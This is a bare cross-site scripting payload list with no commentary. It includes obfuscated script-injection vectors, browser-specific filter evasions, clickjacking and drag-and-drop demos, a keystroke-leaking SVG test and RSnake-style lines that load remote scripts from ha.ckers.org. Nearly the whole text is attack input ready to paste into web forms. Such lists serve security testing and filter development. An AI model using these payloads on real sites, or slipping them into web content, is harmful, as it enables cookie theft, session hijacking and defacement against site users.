<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
<img src=`xx:xx`onerror=alert(1)>
<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>?
<math><a xlink:href="//jsfiddle.net/t846h/">click
<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>?
<svg contentScriptType=text/vbs><script>MsgBox+1
<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
<script>~'\u0061' ;  \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073.  \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script ????????????
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
<script>+-+-1-+-+alert(1)</script>
<body/onload=&lt;!--&gt;&#10alert(1)>
<script itworksinallbrowsers>/*<script* */alert(1)</script ?
<img src ?itworksonchrome?\/onerror = alert(1)???
<svg><script>//&NewLine;confirm(1);</script </svg>
<svg><script onlypossibleinopera:-)> alert(1)
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
<script x> alert(1) </script 1=2
<div/onmouseover='alert(1)'> style="x:">
<--`<img/src=` onerror=alert(1)> --!>
<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ?
<div  style="position:absolute;top:0;left:0;width:100%;height:100%"  onmouseover="prompt(1)" onclick="alert(1)">x</button>?
"><img src=x onerror=window.open('https://www.google.com/');>
<form><button formaction=javascript&colon;alert(1)>CLICKME
<math><a xlink:href="//jsfiddle.net/t846h/">click
<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>?
<iframe  src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
<a  href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click  Me</a>
"><img src=x onerror=prompt(1);>
<div id="1"><form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>//["'`-->]]>]</div><div id="2"><meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi//["'`-->]]>]</div><div id="3"><meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>//["'`-->]]>]</div><div id="4">0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))//["'`-->]]>]</div><div id="5"><script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(5)',384,null,'rsa-dual-use')</script>//["'`-->]]>]</div><div id="6"><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>//["'`-->]]>]</div><div id="7"><input onfocus=alert(7) autofocus>//["'`-->]]>]</div><div id="8"><input onblur=alert(8) autofocus><input autofocus>//["'`-->]]>]</div><div id="9"><a style="-o-link:'javascript:alert(9)';-o-link-source:current">X</a>//["'`-->]]>]</div><div id="10"><video poster=javascript:alert(10)//></video>//["'`-->]]>]</div><div id="11"><svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(11)"></g></svg>//["'`-->]]>]</div><div id="12"><body onscroll=alert(12)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>//["'`-->]]>]</div><div id="13"><x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>//["'`-->]]>]</div><div id="14"><input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>//["'`-->]]>]</div><div id="15"><script>({0:#0=alert/#0#/#0#(0)})</script>//["'`-->]]>]</div><div id="16">X<x style=`behavior:url(#default#time2)` onbegin=`alert(16)` >//["'`-->]]>]</div><div id="17"><?xml-stylesheet href="javascript:alert(17)"?><root/>//["'`-->]]>]</div><div id="18"><script xmlns="http://www.w3.org/1999/xhtml">&#x61;l&#x65;rt&#40;1)</script>//["'`-->]]>]</div><div id="19"><meta charset="x-mac-farsi">¼script ¾alert(19)//¼/script ¾//["'`-->]]>]</div><div id="20"><script>ReferenceError.prototype.__defineGetter__('name', function(){alert(20)}),x</script>//["'`-->]]>]</div><div id="21"><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(21)')()</script>//["'`-->]]>]</div><div id="22"><input onblur=focus() autofocus><input>//["'`-->]]>]</div><div id="23"><form id=test onforminput=alert(23)><input></form><button form=test onformchange=alert(2)>X</button>//["'`-->]]>]</div><div id="24">1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=alert(24)&gt;`>//["'`-->]]>]</div><div id="25"><script src="#">{alert(25)}</script>;1//["'`-->]]>]</div><div id="26">+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);//["'`-->]]>]</div><div id="27"><style>p[foo=bar{}*{-o-link:'javascript:alert(27)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>//["'`-->]]>]</div>
<div id="28">1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=alert(28)&gt;>//["'`-->]]>]</div>
<div id="29"><link rel=stylesheet href=data:,*%7bx:expression(alert(29))%7d//["'`-->]]>]</div><div id="30"><style>@import "data:,*%7bx:expression(alert(30))%7D";</style>//["'`-->]]>]</div><div id="31"><frameset onload=alert(31)>//["'`-->]]>]</div><div id="32"><table background="javascript:alert(32)"></table>//["'`-->]]>]</div><div id="33"><a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(33);">XXX</a></a><a href="javascript:alert(2)">XXX</a>//["'`-->]]>]</div><div id="34">1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe>//["'`-->]]>]</div><div id="35">1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(35) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>//["'`-->]]>]</div><div id="36"><a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(36)">XXX</a>//["'`-->]]>]</div><div id="37"><!--<img src="--><img src=x onerror=alert(37)//">//["'`-->]]>]</div><div id="38"><comment><img src="</comment><img src=x onerror=alert(38)//">//["'`-->]]>]</div>
<div id="39"><!-- up to Opera 11.52, FF 3.6.28 -->
<![><img src="]><img src=x onerror=alert(39)//">

<!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+  -->
<svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror=alert(2)//"></svg>//["'`-->]]>]</div>
<div id="40"><style><img src="</style><img src=x onerror=alert(40)//">//["'`-->]]>]</div>
<div id="41"><li style=list-style:url() onerror=alert(41)></li>
<div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(41)></div>//["'`-->]]>]</div>
<div id="42"><head><base href="javascript://"/></head><body><a href="/. /,alert(42)//#">XXX</a></body>//["'`-->]]>]</div>
<div id="43"><?xml version="1.0" standalone="no"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<style type="text/css">
@font-face {font-family: y; src: url("font.svg#x") format("svg");} body {font: 100px "y";}
</style>
</head>
<body>Hello</body>
</html>//["'`-->]]>]</div>
<div id="44"><style>*[{}@import'test.css?]{color: green;}</style>X//["'`-->]]>]</div><div id="45"><div style="font-family:'foo[a];color:red;';">XXX</div>//["'`-->]]>]</div><div id="46"><div style="font-family:foo}color=red;">XXX</div>//["'`-->]]>]</div><div id="47"><svg xmlns="http://www.w3.org/2000/svg"><script>alert(47)</script></svg>//["'`-->]]>]</div><div id="48"><SCRIPT FOR=document EVENT=onreadystatechange>alert(48)</SCRIPT>//["'`-->]]>]</div><div id="49"><OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(49)"></OBJECT>//["'`-->]]>]</div><div id="50"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>//["'`-->]]>]</div><div id="51"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>//["'`-->]]>]</div><div id="52"><x style="behavior:url(test.sct)">//["'`-->]]>]</div>
<div id="53"><xml id="xss" src="test.htc"></xml>
<label dataformatas="html" datasrc="#xss" datafld="payload"></label>//["'`-->]]>]</div>
<div id="54"><script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>//["'`-->]]>]</div><div id="55"><video><source onerror="alert(55)">//["'`-->]]>]</div><div id="56"><video onerror="alert(56)"><source></source></video>//["'`-->]]>]</div><div id="57"><b <script>alert(57)//</script>0</script></b>//["'`-->]]>]</div><div id="58"><b><script<b></b><alert(58)</script </b></b>//["'`-->]]>]</div><div id="59"><div id="div1"><input value="``onmouseover=alert(59)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>//["'`-->]]>]</div><div id="60"><div style="[a]color[b]:[c]red">XXX</div>//["'`-->]]>]</div>
<div id="61"><div  style="\63&#9\06f&#10\0006c&#12\00006F&#13\R:\000072 Ed;color\0\bla:yellow\0\bla;col\0\00 \&#xA0or:blue;">XXX</div>//["'`-->]]>]</div>

<div id="62"><!-- IE 6-8 -->
<x '="foo"><x foo='><img src=x onerror=alert(62)//'>

<!-- IE 6-9 -->
<! '="foo"><x foo='><img src=x onerror=alert(2)//'>
<? '="foo"><x foo='><img src=x onerror=alert(3)//'>//["'`-->]]>]</div>

<div id="63"><embed src="javascript:alert(63)"></embed> // O10.10↓, OM10.0↓, GC6↓, FF
<img src="javascript:alert(2)">
<image src="javascript:alert(2)"> // IE6, O10.10↓, OM10.0↓
<script src="javascript:alert(3)"></script> // IE6, O11.01↓, OM10.1↓//["'`-->]]>]</div>
<div id="64"><!DOCTYPE x[<!ENTITY x SYSTEM "http://html5sec.org/test.xxe">]><y>&x;</y>//["'`-->]]>]</div><div id="65"><svg onload="javascript:alert(65)" xmlns="http://www.w3.org/2000/svg"></svg>//["'`-->]]>]</div>
<div id="66"><?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(66)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?>
<root/>//["'`-->]]>]</div>

<div id="67"><!DOCTYPE x [
    <!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "xx:x"
 onerror CDATA "alert(67)"
 onload CDATA "alert(2)">
]><img />//["'`-->]]>]</div>

<div id="68"><doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml">
    <html:style /><x xlink:href="javascript:alert(68)" xlink:type="simple">XXX</x>
</doc>//["'`-->]]>]</div>
<div id="69"><card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="javascript:alert(69)"/></onevent><timer value="1"/></card>//["'`-->]]>]</div><div id="70"><div style=width:1px;filter:glow onfilterchange=alert(70)>x</div>//["'`-->]]>]</div><div id="71"><// style=x:expression\28alert(71)\29>//["'`-->]]>]</div><div id="72"><form><button formaction="javascript:alert(72)">X</button>//["'`-->]]>]</div><div id="73"><event-source src="event.php" onload="alert(73)">//["'`-->]]>]</div><div id="74"><a href="javascript:alert(74)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A" /></a>//["'`-->]]>]</div><div id="75"><script<{alert(75)}/></script </>//["'`-->]]>]</div><div id="76"><?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "test.dtd"><x>&x;</x>//["'`-->]]>]</div><div id="77"><?xml-stylesheet type="text/css"?><root style="x:expression(alert(77))"/>//["'`-->]]>]</div><div id="78"><?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:test.xdr"/>//["'`-->]]>]</div><div id="79"><object allowscriptaccess="always" data="test.swf"></object>//["'`-->]]>]</div><div id="80"><style>*{x:ｅｘｐｒｅｓｓｉｏｎ(alert(80))}</style>//["'`-->]]>]</div><div id="81"><x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="javascript:alert(81)" xlink:type="simple"/>//["'`-->]]>]</div><div id="82"><?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>//["'`-->]]>]</div>
<div id="83"><x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(83)"><x:timer value="1"/></x:template>//["'`-->]]>]</div>
<div id="84"><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="javascript:alert(84)//#x"/>//["'`-->]]>]</div><div id="85"><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="test.evt#x"/>//["'`-->]]>]</div><div id="86"><body oninput=alert(86)><input autofocus>//["'`-->]]>]</div>
<div id="87"><svg xmlns="http://www.w3.org/2000/svg">
<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(87)"><rect width="1000" height="1000" fill="white"/></a>
</svg>//["'`-->]]>]</div>

<div id="88"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">

<animation xlink:href="javascript:alert(88)"/>
<animation xlink:href="data:text/xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E"/>

<image xlink:href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E"/>

<foreignObject xlink:href="javascript:alert(88)"/>
<foreignObject xlink:href="data:text/xml,%3Cscript xmlns='http://www.w3.org/1999/xhtml'%3Ealert(88)%3C/script%3E"/>

</svg>//["'`-->]]>]</div>

<div id="89"><svg xmlns="http://www.w3.org/2000/svg">
<set attributeName="onmouseover" to="alert(89)"/>
<animate attributeName="onunload" to="alert(89)"/>
</svg>//["'`-->]]>]</div>

<div id="90"><!-- Up to Opera 10.63 -->
<div style=content:url(test2.svg)></div>

<!-- Up to Opera 11.64 - see link below -->

<!-- Up to Opera 12.x -->
<div style="background:url(test5.svg)">PRESS ENTER</div>//["'`-->]]>]</div>

<div id="91">[A]
<? foo="><script>alert(91)</script>">
<! foo="><script>alert(91)</script>">
</ foo="><script>alert(91)</script>">
[B]
<? foo="><x foo='?><script>alert(91)</script>'>">
[C]
<! foo="[[[x]]"><x foo="]foo><script>alert(91)</script>">
[D]
<% foo><x foo="%><script>alert(91)</script>">//["'`-->]]>]</div>
<div id="92"><div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div><div id="93"><div style="list-style:url(http://foo.f)\20url(javascript:alert(93));">X</div>//["'`-->]]>]</div>
<div id="94"><svg xmlns="http://www.w3.org/2000/svg">
<handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(94)</handler>
</svg>//["'`-->]]>]</div>

<div id="95"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<feImage>
<set attributeName="xlink:href" to="data:image/svg+xml;charset=utf-8;base64,
PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/>
</feImage>
</svg>//["'`-->]]>]</div>

<div id="96"><iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe>
<iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>//["'`-->]]>]</div>

<div id="97"><!-- IE 5-9 -->
<div id=d><x xmlns="><iframe onload=alert(97)"></div>
<script>d.innerHTML+='';</script>

<!-- IE 10 in IE5-9 Standards mode -->
<div id=d><x xmlns='"><iframe onload=alert(2)//'></div>
<script>d.innerHTML+='';</script>//["'`-->]]>]</div>

<div id="98"><div id=d><div style="font-family:'sans\27\2F\2A\22\2A\2F\3B color\3Ared\3B'">X</div></div>
<script>with(document.getElementById("d"))innerHTML=innerHTML</script>//["'`-->]]>]</div>

<div id="99">XXX<style>

*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */

<!--
--><!--*{color:red}   /* all UA */

*{background:url(xx:x //**/\red/*)} /* IE 6-7 Standards mode */

</style>//["'`-->]]>]</div>
<div id="100"><img[a][b]src=x[d]onerror[c]=[e]"alert(100)">//["'`-->]]>]</div><div id="101"><a href="[a]java[b]script[c]:alert(101)">XXX</a>//["'`-->]]>]</div><div id="102"><img src="x` `<script>alert(102)</script>"` `>//["'`-->]]>]</div><div id="103"><script>history.pushState(0,0,'/i/am/somewhere_else');</script>//["'`-->]]>]</div>
<div id="104"><svg xmlns="http://www.w3.org/2000/svg" id="foo">
<x xmlns="http://www.w3.org/2001/xml-events" event="load" observer="foo" handler="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(104) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar"/>
</svg>//["'`-->]]>]</div>
<div id="105"><iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>//["'`-->]]>]</div><div id="106"><img src onerror /" '"= alt=alert(106)//">//["'`-->]]>]</div><div id="107"><title onpropertychange=alert(107)></title><title title=></title>//["'`-->]]>]</div>
<div id="108"><!-- IE 5-8 standards mode -->
<a href=http://foo.bar/#x=`y></a><img alt="`><img src=xx:x onerror=alert(108)></a>">

<!-- IE 5-9 standards mode -->
<!a foo=x=`y><img alt="`><img src=xx:x onerror=alert(2)//">
<?a foo=x=`y><img alt="`><img src=xx:x onerror=alert(3)//">//["'`-->]]>]</div>

<div id="109"><svg xmlns="http://www.w3.org/2000/svg">
<a id="x"><rect fill="white" width="1000" height="1000"/></a>
<rect  fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/>
</svg>//["'`-->]]>]</div>

<div id="110"><svg xmlns="http://www.w3.org/2000/svg">
<path d="M0,0" style="marker-start:url(test4.svg#a)"/>
</svg>//["'`-->]]>]</div>
<div id="111"><div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div><div id="112"><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div>
<div id="113"><div id="x">XXX</div>
<style>

#x{font-family:foo[bar;color:green;}

#y];color:red;{}

</style>//["'`-->]]>]</div>
<div id="114"><x style="background:url('x[a];color:red;/*')">XXX</x>//["'`-->]]>]</div>
<div id="115"><!--[if]><script>alert(115)</script -->
<!--[if<img src=x onerror=alert(2)//]> -->//["'`-->]]>]</div>

<div id="116"><div id="x">x</div>
<xml:namespace prefix="t">
<import namespace="t" implementation="#default#time2">
<t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=alert(116)&gt;">//["'`-->]]>]</div>

<div id="117"><a href="http://attacker.org">
    <iframe src="http://example.org/"></iframe>
</a>//["'`-->]]>]</div>

<div id="118"><div draggable="true" ondragstart="event.dataTransfer.setData('text/plain','malicious code');">
    <h1>Drop me</h1>
</div>

<iframe src="http://www.example.org/dropHere.html"></iframe>//["'`-->]]>]</div>

<div id="119"><iframe src="view-source:http://www.example.org/" frameborder="0" style="width:400px;height:180px"></iframe>

<textarea type="text" cols="50" rows="10"></textarea>//["'`-->]]>]</div>

<div id="120"><script>
function makePopups(){
    for (i=1;i<6;i++) {
        window.open('popup.html','spam'+i,'width=50,height=50');
    }
}
</script>

<body>
<a href="#" onclick="makePopups()">Spam</a>//["'`-->]]>]</div>

<div id="121"><html xmlns="http://www.w3.org/1999/xhtml"
xmlns:svg="http://www.w3.org/2000/svg">
<body style="background:gray">
<iframe src="http://example.com/" style="width:800px; height:350px; border:none; mask: url(#maskForClickjacking);"/>
<svg:svg>
<svg:mask id="maskForClickjacking" maskUnits="objectBoundingBox" maskContentUnits="objectBoundingBox">
    <svg:rect x="0.0" y="0.0" width="0.373" height="0.3" fill="white"/>
    <svg:circle cx="0.45" cy="0.7" r="0.075" fill="white"/>
</svg:mask>
</svg:svg>
</body>
</html>//["'`-->]]>]</div>
<div id="122"><iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe>//["'`-->]]>]</div>
<div id="123"><span class=foo>Some text</span>
<a class=bar href="http://www.example.org">www.example.org</a>

<script src="http://code.jquery.com/jquery-1.4.4.js"></script>
<script>
$("span.foo").click(function() {
alert('foo');
$("a.bar").click();
});
$("a.bar").click(function() {
alert('bar');
location="http://html5sec.org";
});
</script>//["'`-->]]>]</div>

<div id="124"><script src="/\example.com\foo.js"></script> // Safari 5.0, Chrome 9, 10
<script src="\\example.com\foo.js"></script> // Safari 5.0//["'`-->]]>]</div>

<div id="125"><?xml version="1.0"?>
<?xml-stylesheet type="text/xml" href="#stylesheet"?>
<!DOCTYPE doc [
<!ATTLIST xsl:stylesheet
  id    ID    #REQUIRED>]>
<svg xmlns="http://www.w3.org/2000/svg">
    <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(125)"></iframe>
        </xsl:template>
    </xsl:stylesheet>
    <circle fill="red" r="40"></circle>
</svg>//["'`-->]]>]</div>

<div id="126"><object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object>
<object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="alert(126)" style="behavior:url(#x);"><param name=postdomevents /></object>//["'`-->]]>]</div>

<div id="127"><svg xmlns="http://www.w3.org/2000/svg" id="x">
<listener event="load" handler="#y" xmlns="http://www.w3.org/2001/xml-events" observer="x"/>
<handler id="y">alert(127)</handler>
</svg>//["'`-->]]>]</div>
<div id="128"><svg><style>&lt;img/src=x onerror=alert(128)// </b>//["'`-->]]>]</div>
<div id="129"><svg>
<image style='filter:url("data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.alert(129)</script></svg>")'>
<!--
Same effect with
<image filter='...'>
-->
</svg>//["'`-->]]>]</div>

<div id="130"><math href="javascript:alert(130)">CLICKME</math>

<math>
<!-- up to FF 13 -->
<maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(2)">CLICKME</maction>

<!-- FF 14+ -->
<maction actiontype="statusline" xlink:href="javascript:alert(3)">CLICKME<mtext>http://http://google.com</mtext></maction>
</math>//["'`-->]]>]</div>

<div id="131"><b>drag and drop one of the following strings to the drop box:</b>
<br/><hr/>
jAvascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//
<br/><hr/>
feed:javascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//
<br/><hr/>
feed:data:text/html,&#x3c;script>alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie)&#x3c;/script>&#x3c;b>
<br/><hr/>
feed:feed:javAscript:javAscript:feed:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//
<br/><hr/>
<div id="dropbox" style="height: 360px;width: 500px;border: 5px solid #000;position: relative;" ondragover="event.preventDefault()">+ Drop Box +</div>//["'`-->]]>]</div>

<div id="132"><!doctype html>
<form>
<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>
<br>
<input name="secret" type="password">
</form>
<!-- injection --><svg height="50px">
<image xmlns:xlink="http://www.w3.org/1999/xlink">
<set attributeName="xlink:href" begin="accessKey(a)" to="//example.com/?a" />
<set attributeName="xlink:href" begin="accessKey(b)" to="//example.com/?b" />
<set attributeName="xlink:href" begin="accessKey(c)" to="//example.com/?c" />
<set attributeName="xlink:href" begin="accessKey(d)" to="//example.com/?d" />
</image>
</svg>//["'`-->]]>]</div>
<div id="133"><!-- `<img/src=xx:xx onerror=alert(133)//--!>//["'`-->]]>]</div>
<div id="134"><xmp>
<%
</xmp>
<img alt='%></xmp><img src=xx:x onerror=alert(134)//'>

<script>
x='<%'
</script> %>/
alert(2)
</script>

XXX
<style>
*['<!--']{}
</style>
-->{}
*{color:red}</style>//["'`-->]]>]</div>

<div id="135"><?xml-stylesheet type="text/xsl" href="#" ?>
<stylesheet xmlns="http://www.w3.org/TR/WD-xsl">
<template match="/">
<eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.alert(135)</eval>
<if expr="new ActiveXObject('htmlfile').parentWindow.alert(2)"></if>
</template>
</stylesheet>//["'`-->]]>]</div>

<div id="136"><form action="" method="post">
<input name="username" value="admin" />
<input name="password" type="password" value="secret" />
<input name="injected" value="injected" dirname="password" />
<input type="submit">
</form>//["'`-->]]>]</div>

<div id="137"><svg>
<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?">
<circle r="400"></circle>
<animate attributeName="xlink:href" begin="0" from="javascript:alert(137)" to="&" />
</a>//["'`-->]]>]</div>
<div id="138"><link rel="import" href="test.svg" />//["'`-->]]>]</div><div id="139"><iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />//["'`-->]]>]</div>undefined
<SCRIPT>alert('XSS');</SCRIPT>
'';!--"<XSS>=&{()}
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<IMG SRC="jav	ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
<IMG SRC=" &#14;  javascript:alert('XSS');">
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>
<IMG SRC="javascript:alert('XSS')"
<SCRIPT>a=/XSS/
\";alert('XSS');//
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<BODY BACKGROUND="javascript:alert('XSS')">
<BODY ONLOAD=alert('XSS')>
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<BGSOUND SRC="javascript:alert('XSS');">
<BR SIZE="&{alert('XSS')}">
<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
<IMG SRC='vbscript:msgbox("XSS")'>
<IMG SRC="mocha:[code]">
